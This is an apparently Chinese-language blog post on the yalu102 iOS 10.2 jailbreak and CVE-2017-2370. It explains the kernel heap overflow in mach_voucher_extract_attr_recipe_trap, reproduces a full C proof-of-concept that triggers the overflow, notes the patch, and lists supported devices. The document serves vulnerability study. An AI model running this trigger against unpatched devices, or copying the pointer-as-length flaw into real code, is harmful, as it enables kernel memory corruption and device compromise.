<!DOCTYPE html>
<html>
  <!-- Html Head Tag-->
  <head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="">
  <meta name="author" content="FloatingGuy">
  <!-- Open Graph Data -->
  <meta property="og:title" content="yalu102 越狱"/>
  <meta property="og:description" content="" />
  <meta property="og:site_name" content="FloatingGuy&#39;s Blog"/>
  <meta property="og:type" content="article" />
  <meta property="og:image" content="http://yoursite.comundefined"/>
  
    <link rel="alternate" href="/atom.xml" title="FloatingGuy&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  

  <!-- Site Title -->
  <title>FloatingGuy's Blog</title>

  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="/css/bootstrap.min.css">
  <!-- Custom CSS -->
  
  <link rel="stylesheet" href="/css/style.light.css">

  <!-- Google Analytics -->
  

</head>

  <body>
    <!-- Page Header -->


<header class="site-header header-background" style="background-image: url(/img/2.jpg)">
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <div class="page-title with-background-image">
          <p class="title">yalu102 越狱</p>
          <p class="subtitle"></p>
        </div>
        <div class="site-menu with-background-image">
          <ul>
            
              <li>
                <a href="/">
                  
                  Home
                  
                </a>
              </li>
            
              <li>
                <a href="/archives">
                  
                  Archives
                  
                </a>
              </li>
            
              <li>
                <a href="https://github.com/FloatingGuy">
                  
                  Github
                  
                </a>
              </li>
            
              <li>
                <a href="mailto:1776880807@qq.com">
                  
                  Email
                  
                </a>
              </li>
            
          </ul>
        </div>
      </div>
    </div>
  </div>
</header>


<article>
  <div class="container typo">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <div class="post-info text-muted">
          
            <!-- Author -->
            <span class="author info">By FloatingGuy</span>
          
          <!-- Date -->
          <span class="date-time info">On
            <span class="date">2017-02-07</span>
            <span class="time">15:28:40</span>
          </span>
          
          <!--  Categories  -->
            <span class="categories info">Under 

<a href="/categories/categories-exploit/">漏洞</a>
</span>
          
        </div>
        <!-- Tags -->
        
          <div class="post-tags text-muted">
            Tags: 

<a class="tag" href="/tags/ios/">#ios</a> <a class="tag" href="/tags/了解/">#了解</a>


          </div>
        
        <!-- Post Main Content -->
        <div class="post-content">
          <h3 id="基本信息："><a href="#基本信息：" class="headerlink" title="基本信息："></a>基本信息：</h3><p>luca 发布了ios 10.2 版本的开源越狱工具。<br>yalu 102 repo: <a href="https://github.com/kpwn/yalu102" target="_blank" rel="external">https://github.com/kpwn/yalu102</a><br>zhengmin repo:<a href="https://github.com/zhengmin1989/yalu102.git" target="_blank" rel="external">https://github.com/zhengmin1989/yalu102.git</a><br>CVE: CVE-2017-2370</p>
<a id="more"></a>
<h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>漏洞在mach_voucher_extract_attr_recipe_trap(struct mach_voucher_extract_attr_recipe_args *args)函数中, 因为错误的将用户态指针(args-&gt;recipe_size)当成了长度值， 导致内核堆溢出漏洞。<br>因为拷贝的数据源和拷贝的长度都是用户可控的所以利用比较容易。</p>
<h3 id="简易POC"><a href="#简易POC" class="headerlink" title="简易POC:"></a>简易POC:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div></pre></td><td class="code"><pre><div class="line">// ianbeer</div><div class="line">#if 0</div><div class="line">iOS/MacOS kernel memory corruption due to userspace pointer being used as a length</div><div class="line"></div><div class="line">mach_voucher_extract_attr_recipe_trap is a mach trap which can be called from any context</div><div class="line"></div><div class="line">Here&apos;s the code:</div><div class="line"></div><div class="line">    kern_return_t</div><div class="line">    mach_voucher_extract_attr_recipe_trap(struct mach_voucher_extract_attr_recipe_args *args)</div><div class="line">    &#123;</div><div class="line">        ipc_voucher_t voucher = IV_NULL;</div><div class="line">        kern_return_t kr = KERN_SUCCESS;</div><div class="line">        mach_msg_type_number_t sz = 0;</div><div class="line"></div><div class="line">        if (copyin(args-&gt;recipe_size, (void *)&amp;sz, sizeof(sz)))     &lt;---------- (a)</div><div class="line">            return KERN_MEMORY_ERROR;</div><div class="line"></div><div class="line">        if (sz &gt; MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE)</div><div class="line">            return MIG_ARRAY_TOO_LARGE;</div><div class="line"></div><div class="line">        voucher = convert_port_name_to_voucher(args-&gt;voucher_name);</div><div class="line">        if (voucher == IV_NULL)</div><div class="line">            return MACH_SEND_INVALID_DEST;</div><div class="line"></div><div class="line">        mach_msg_type_number_t __assert_only max_sz = sz;</div><div class="line"></div><div class="line">        if (sz &lt; MACH_VOUCHER_TRAP_STACK_LIMIT) &#123;</div><div class="line">            /* keep small recipes on the stack for speed */</div><div class="line">            uint8_t krecipe[sz];</div><div class="line">            if (copyin(args-&gt;recipe, (void *)krecipe, sz)) &#123;</div><div class="line">                kr = KERN_MEMORY_ERROR;</div><div class="line">                goto done;</div><div class="line">            &#125;</div><div class="line">            kr = mach_voucher_extract_attr_recipe(voucher, args-&gt;key,</div><div class="line">                    (mach_voucher_attr_raw_recipe_t)krecipe, &amp;sz);</div><div class="line">            assert(sz &lt;= max_sz);</div><div class="line"></div><div class="line">            if (kr == KERN_SUCCESS &amp;&amp; sz &gt; 0)</div><div class="line">                kr = copyout(krecipe, (void *)args-&gt;recipe, sz);</div><div class="line">        &#125; else &#123;</div><div class="line">            uint8_t *krecipe = kalloc((vm_size_t)sz);                 &lt;---------- (b)</div><div class="line">            if (!krecipe) &#123;</div><div class="line">                kr = KERN_RESOURCE_SHORTAGE;</div><div class="line">                goto done;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            if (copyin(args-&gt;recipe, (void *)krecipe, args-&gt;recipe_size)) &#123;         &lt;----------- (c)</div><div class="line">                kfree(krecipe, (vm_size_t)sz);</div><div class="line">                kr = KERN_MEMORY_ERROR;</div><div class="line">                goto done;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            kr = mach_voucher_extract_attr_recipe(voucher, args-&gt;key,</div><div class="line">                    (mach_voucher_attr_raw_recipe_t)krecipe, &amp;sz);</div><div class="line">            assert(sz &lt;= max_sz);</div><div class="line"></div><div class="line">            if (kr == KERN_SUCCESS &amp;&amp; sz &gt; 0)</div><div class="line">                kr = copyout(krecipe, (void *)args-&gt;recipe, sz);</div><div class="line">            kfree(krecipe, (vm_size_t)sz);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        kr = copyout(&amp;sz, args-&gt;recipe_size, sizeof(sz));</div><div class="line"></div><div class="line">    done:</div><div class="line">        ipc_voucher_release(voucher);</div><div class="line">        return kr;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">Here&apos;s the argument structure (controlled from userspace)</div><div class="line"></div><div class="line">    struct mach_voucher_extract_attr_recipe_args &#123;</div><div class="line">        PAD_ARG_(mach_port_name_t, voucher_name);</div><div class="line">        PAD_ARG_(mach_voucher_attr_key_t, key);</div><div class="line">        PAD_ARG_(mach_voucher_attr_raw_recipe_t, recipe);</div><div class="line">        PAD_ARG_(user_addr_t, recipe_size);</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">recipe and recipe_size are userspace pointers.</div><div class="line"></div><div class="line">At point (a) four bytes are read from the userspace pointer recipe_size into sz.</div><div class="line"></div><div class="line">At point (b) if sz was less than MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE (5120) and greater than MACH_VOUCHER_TRAP_STACK_LIMIT (256)</div><div class="line">sz is used to allocate a kernel heap buffer.</div><div class="line"></div><div class="line">At point (c) copyin is called again to copy userspace memory into that buffer which was just allocated, but rather than passing sz (the</div><div class="line">validate size which was allocated) args-&gt;recipe_size is passed as the size. This is the userspace pointer *to* the size, not the size!</div><div class="line"></div><div class="line">This leads to a completely controlled kernel heap overflow.</div><div class="line"></div><div class="line">Tested on MacOS Sierra 10.12.1 (16B2555)</div><div class="line">#endif</div><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">#include &lt;mach/mach.h&gt;</div><div class="line">#include &lt;mach/mach_vm.h&gt;</div><div class="line">#include &lt;mach/mach_error.h&gt;</div><div class="line">#include &lt;mach/mach_traps.h&gt;</div><div class="line">#include &lt;mach/mach_voucher_types.h&gt;</div><div class="line"></div><div class="line">#include &lt;atm/atm_types.h&gt;</div><div class="line"></div><div class="line">mach_port_t get_voucher() &#123;</div><div class="line">  mach_voucher_attr_recipe_data_t r = &#123;</div><div class="line">    .key = MACH_VOUCHER_ATTR_KEY_ATM,</div><div class="line">    .command = MACH_VOUCHER_ATTR_ATM_CREATE</div><div class="line">  &#125;;</div><div class="line">  mach_port_t p = MACH_PORT_NULL;</div><div class="line">  kern_return_t err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&amp;r, sizeof(r), &amp;p);</div><div class="line"></div><div class="line">  if (err != KERN_SUCCESS) &#123;</div><div class="line">    printf(&quot;failed to create voucher (%s)\n&quot;, mach_error_string(err));</div><div class="line">    exit(EXIT_FAILURE);</div><div class="line">  &#125;</div><div class="line">   printf(&quot;got voucher: %x\n&quot;, p);</div><div class="line"></div><div class="line">  return p;</div><div class="line">&#125;</div><div class="line"></div><div class="line">uint64_t map(uint64_t addr, uint64_t size) &#123;</div><div class="line">  uint64_t _addr = addr;</div><div class="line">  kern_return_t err = mach_vm_allocate(mach_task_self(), &amp;_addr, size, 0);</div><div class="line">  if (err != KERN_SUCCESS || _addr != addr) &#123;</div><div class="line">    printf(&quot;failed to allocate fixed mapping: %s\n&quot;, mach_error_string(err));</div><div class="line">    exit(EXIT_FAILURE);</div><div class="line">  &#125;</div><div class="line">  return addr;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main() &#123;</div><div class="line">  void* recipe_size = (void*)map(0x123450000, 0x1000);</div><div class="line">  *(uint64_t*)recipe_size = 0x1000;</div><div class="line"></div><div class="line">  uint64_t size = 0x1000000;</div><div class="line">  void* recipe = malloc(size);</div><div class="line">  memset(recipe, 0x41, size);</div><div class="line"></div><div class="line">  mach_port_t port = get_voucher();</div><div class="line">  kern_return_t err = mach_voucher_extract_attr_recipe_trap(</div><div class="line">      port,</div><div class="line">      1,</div><div class="line">      recipe,</div><div class="line">      recipe_size);</div><div class="line"></div><div class="line">  printf(&quot;%s\n&quot;, mach_error_string(err));</div><div class="line"></div><div class="line">  return 41;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>目前此漏洞已经在 macOS 10.12.3 和 iOS 10.2.1 上被修复。</p>
<h3 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h3><p>在iphone6 10.2版本的手机上使用 zhengmin 编译的ipa 可以越狱但是不稳定，重启以后cydia 闪退。</p>
<p>Supported Devices and iOS versions</p>
<table>
<thead>
<tr>
<th>Device</th>
<th>Version</th>
</tr>
</thead>
<tbody>
<tr>
<td>iPad Pro</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPhone 6S</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPhone SE</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPhone 5S</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPad Air</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPad Mini 2</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPhone 6</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPad Mini 3</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPad Air 2</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPad Mini 4</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
<tr>
<td>iPod touch (6G)</td>
<td>iOS 10.0.0 -&gt; iOS 10.2</td>
</tr>
</tbody>
</table>

        </div>
      </div>
    </div>
  </div>
</article>



    <!-- Footer -->
<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <p class="copyright text-muted">
          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
        <p class="copyright text-muted">
          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
        </p>
      </div>
    </div>
  </div>
</footer>


    <!-- After Footer Scripts -->
<script src="/js/highlight.pack.js"></script>
<script>
  document.addEventListener("DOMContentLoaded", function(event) {
    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
    codeBlocks.forEach(function(block, index) {
      hljs.highlightBlock(block);
    });
  });
</script>

  </body>
</html>

